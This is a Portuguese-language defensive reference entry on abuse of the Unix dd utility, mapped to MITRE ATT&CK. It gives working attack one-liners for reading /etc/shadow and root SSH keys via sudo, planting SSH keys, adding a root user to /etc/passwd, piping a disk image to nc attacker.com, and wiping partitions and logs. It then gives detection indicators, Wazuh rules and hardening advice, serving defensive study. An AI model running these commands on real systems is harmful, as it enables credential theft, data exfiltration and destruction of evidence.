# dd

**Plataforma:** Linux / macOS / Unix

**Categorias:** Leitura de arquivo raw, Exfiltração, Escrita em disco, Destruição de dados, Bypass de permissões de arquivo

**MITRE ATT&CK:** T1006 (Direct Volume Access), T1048 (Exfiltration), T1485 (Data Destruction), T1005 (Data from Local System)

**Referência ofensiva:** https://gtfobins.org/gtfobins/dd/

---

## O que é o dd

O dd é um utilitário Unix de baixo nível para cópia e conversão de dados. Opera diretamente em nível de byte, sem considerar estrutura de sistema de arquivos. É usado legitimamente para: criar imagens de disco, duplicar partições, sobrescrever discos com zeros ou dados aleatórios, converter formatos de arquivo e testar desempenho de disco.

A característica que o torna relevante para segurança é justamente essa operação em nível raw: o dd pode ler e escrever em arquivos de dispositivo (`/dev/sda`, `/dev/mem`), em arquivos de sistema de arquivos arbitrários e em qualquer localização do disco diretamente — contornando permissões de arquivo em certas condições.

---

## Por que atacantes usam o dd

O dd aparece principalmente em dois contextos: leitura de arquivos bloqueados por permissão (quando executado com SUID ou sudo) e destruição de evidências (sobrescrita de arquivos ou de disco). Em ambos os casos, sua natureza de baixo nível e sua presença universal em sistemas Unix o tornam uma ferramenta de oportunidade.

---

## Técnicas de abuso

### Leitura de arquivo via sudo ou SUID

```bash
# Se sudoers: user ALL=(ALL) NOPASSWD: /bin/dd
# Ler /etc/shadow como root
sudo dd if=/etc/shadow

# Ler arquivo de configuração com credenciais
sudo dd if=/etc/mysql/debian.cnf

# Salvar saída em arquivo
sudo dd if=/etc/shadow of=/tmp/shadow_copy

# Ler chave privada SSH do root
sudo dd if=/root/.ssh/id_rsa
```

### Escrita em arquivo privilegiado via sudo

```bash
# Escrever chave SSH autorizada no /root/.ssh/authorized_keys
echo "ssh-rsa AAAA... attacker" | sudo dd of=/root/.ssh/authorized_keys

# Adicionar ao final (append)
echo "ssh-rsa AAAA... attacker" | sudo dd of=/root/.ssh/authorized_keys oflag=append conv=notrunc

# Sobrescrever /etc/passwd com versão modificada (adicionar usuário root)
cat /etc/passwd > /tmp/passwd_modified
echo "hacker::0:0:root:/root:/bin/bash" >> /tmp/passwd_modified
sudo dd if=/tmp/passwd_modified of=/etc/passwd
```

### Leitura direta do disco (bypass de sistema de arquivos)

Com acesso root ou SUID, o dd pode ler diretamente do dispositivo de bloco, ignorando permissões do sistema de arquivos:

```bash
# Clonar partição inteira para arquivo
sudo dd if=/dev/sda1 of=/tmp/partition.img bs=4096

# Extrair setor de boot (primeiros 512 bytes)
sudo dd if=/dev/sda of=/tmp/mbr.bin bs=512 count=1

# Buscar strings em disco bruto (sem montar sistema de arquivos)
sudo dd if=/dev/sda | strings | grep -i "password\|passwd\|secret"

# Leitura de swap (pode conter dados em memória como senhas em texto claro)
sudo dd if=/dev/swapX | strings | grep -i "password"
```

### Exfiltração de imagem de disco via rede

```bash
# Clonar disco inteiro e enviar via nc para o atacante
sudo dd if=/dev/sda | gzip | nc attacker.com 9001

# Versão com compressão e cifragem
sudo dd if=/dev/sda | gzip | openssl enc -aes-256-cbc -k senha | nc attacker.com 9001

# Via SSH
sudo dd if=/dev/sda | ssh usuario@attacker.com "cat > /tmp/disk.img"
```

### Destruição de evidências / destruição de dados

```bash
# Sobrescrever arquivo com zeros (impede recuperação)
dd if=/dev/zero of=/tmp/payload.exe bs=4096 conv=notrunc

# Sobrescrever arquivo com dados aleatórios
dd if=/dev/urandom of=/var/log/auth.log bs=4096 conv=notrunc

# Destruir partição completa
sudo dd if=/dev/zero of=/dev/sda1 bs=4096

# Sobrescrever apenas espaço livre (para dificultar análise forense)
dd if=/dev/zero of=/tmp/zero_fill bs=4096; rm /tmp/zero_fill
```

### Cópia de arquivo ignorando erros (bypass parcial de permissões)

```bash
# Em alguns sistemas, dd com bs=1 pode ler parcialmente arquivos
# que retornam erros em leituras maiores
dd if=/proc/kallsyms bs=1 count=4096 2>/dev/null
```

---

## Técnicas de bypass e evasão

### Nome do processo inócuo e argumentos não óbvios

```bash
# Os argumentos do dd são menos inspecionáveis que o cat em algumas configurações de auditoria
# dd if=/etc/shadow parece mais "técnico" que cat /etc/shadow para analistas menos experientes
sudo dd if=/etc/shadow of=/dev/stdout status=none
```

### Leitura de memória via /dev/mem ou /proc/kcore

```bash
# Em kernels sem proteções de /dev/mem (antigos ou mal configurados)
sudo dd if=/dev/mem bs=1 skip=$((0x$(grep 'T sys_call_table' /proc/kallsyms | head -1 | cut -f1 -d' '))) count=1000
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- dd com `if=` lendo de `/dev/sda`, `/dev/sda1`, `/dev/mem`, `/dev/swap` — acesso raw a disco
- dd com `of=` escrevendo em `/etc/passwd`, `/etc/shadow`, `/root/.ssh/` — modificação de arquivos críticos
- dd via sudo com `if=` em arquivos sensíveis (`/etc/shadow`, `/root/`)
- dd com pipe para nc, socat ou curl — exfiltração de imagem de disco

**Indicadores de média relevância:**

- dd sobrescrevendo arquivos de log (`/var/log/`) — destruição de evidências
- dd com `if=/dev/zero` ou `if=/dev/urandom` em arquivos de dados — possível destruição intencional

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0103-gtfobins_file_ops.xml -->

<group name="lolbins,gtfobins,linux,file-operations">

  <!-- dd lendo diretamente de dispositivo de bloco -->
  <rule id="100252" level="14">
    <if_group>auditd</if_group>
    <field name="audit.command">dd</field>
    <field name="audit.execve" type="pcre2">if=/dev/(sd|hd|nvme|vd|xvd|mmcblk|mem|swap)</field>
    <description>dd acessando dispositivo de bloco ou memoria diretamente — possivel clonagem de disco ou leitura de swap</description>
    <mitre>
      <id>T1006</id>
    </mitre>
  </rule>

  <!-- dd escrevendo em arquivo sensível do sistema -->
  <rule id="100253" level="15">
    <if_group>auditd</if_group>
    <field name="audit.command">dd</field>
    <field name="audit.execve" type="pcre2">of=(/etc/passwd|/etc/shadow|/etc/sudoers|/root/\.ssh|/etc/cron)</field>
    <description>dd escrevendo em arquivo critico do sistema — possivel modificacao de credenciais ou persistencia</description>
    <mitre>
      <id>T1006</id>
    </mitre>
  </rule>

  <!-- dd sobrescrevendo logs (destruição de evidências) -->
  <rule id="100254" level="13">
    <if_group>auditd</if_group>
    <field name="audit.command">dd</field>
    <field name="audit.execve" type="pcre2">if=/dev/(zero|urandom).*of=/var/log|of=/var/log.*if=/dev/(zero|urandom)</field>
    <description>dd sobrescrevendo logs com zeros ou dados aleatorios — possivel destruicao de evidencias</description>
    <mitre>
      <id>T1485</id>
    </mitre>
  </rule>

</group>
```

### Falsos positivos comuns e como reduzir o ruído

**Backup e clonagem de disco legítimos:** ferramentas de backup de nível baixo como `clonezilla`, `partclone` e scripts de disaster recovery usam dd. Filtre por usuário de serviço de backup e por janela de tempo de backup.

**Testes de desempenho de disco:** administradores usam dd para testar velocidade de leitura/escrita de disco. Esse uso raramente envolve arquivos de sistema sensíveis como destino.

**Geração de arquivos de swap ou imagens:** `dd if=/dev/zero of=/swapfile` é um procedimento legítimo de criação de swap. Filtre por destino (`/swapfile`, `/dev/`) e por usuário root em contexto de configuração de sistema.

---

## Proteção e controles defensivos

**Nunca configurar dd com sudo sem NOEXEC:** se há necessidade operacional de dd via sudo, use a flag `NOEXEC` no sudoers — embora para o dd isso tenha efeito limitado. A abordagem mais segura é criar scripts wrapper que executam operações específicas e dar sudo apenas para o wrapper.

**Proteger dispositivos de bloco com permissões restritas:** certifique-se de que `/dev/sda` e outros dispositivos de bloco não estão acessíveis para usuários não-root (`ls -la /dev/sda` deve mostrar grupo `disk` sem permissão para "others"). Monitore o grupo `disk` — membros desse grupo têm acesso raw ao disco.

---

## Referências

- GTFOBins — dd: https://gtfobins.org/gtfobins/dd/
- MITRE ATT&CK T1006: https://attack.mitre.org/techniques/T1006/
- MITRE ATT&CK T1485: https://attack.mitre.org/techniques/T1485/
